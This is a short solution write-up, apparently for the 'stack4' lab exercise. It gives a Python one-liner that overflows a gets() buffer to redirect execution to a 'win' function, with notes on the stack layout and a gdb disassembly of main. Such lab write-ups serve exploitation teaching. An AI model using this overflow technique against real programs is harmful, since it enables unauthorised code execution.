Solution:

	python3 -c "import sys;sys.stdout.buffer.write(b'\x61'*76+b'\xf4\x83\x04\x08')" | ./stack4

	The most important aspect of this problem is to remember that the address
	after a function call is saved onto the stack before that function call.
	So for the EIP to be overwritten, we want to replace the return address
	with the one at win in little endian, specifically `0xf4830408`.


Analysis:

	(0)win : Saving the bp of the main stack on the stack
		 We only care about the address: 0x80483f4
       (6)main : Allocates 80 bytes onto the stack.
       (9)main : Loads beginning of buffer on stack into eax
      (13)main : Places addr of buffer to top of stack
      (16)main : Calls gets, also addr of 21(main) ontop of stack

   (6)gets@plt : Pushes slot onto stack for lookup (0x08)
  (11)gets@plt : Jumps to libc resolver routine
       (0)gets : Saves base pointer onto stack
       (1)gets : Pushes edi

(gdb) x win
0x80483f4 <win>:        0x83e58955


(gdb) disas main
Dump of assembler code for function main:
   0x08048408 <+0>:     push   ebp
   0x08048409 <+1>:     mov    ebp,esp
   0x0804840b <+3>:     and    esp,0xfffffff0
   0x0804840e <+6>:     sub    esp,0x50
   0x08048411 <+9>:     lea    eax,[esp+0x10]
   0x08048415 <+13>:    mov    DWORD PTR [esp],eax
   0x08048418 <+16>:    call   0x804830c <gets@plt>
   0x0804841d <+21>:    leave  
   0x0804841e <+22>:    ret    
End of assembler dump.

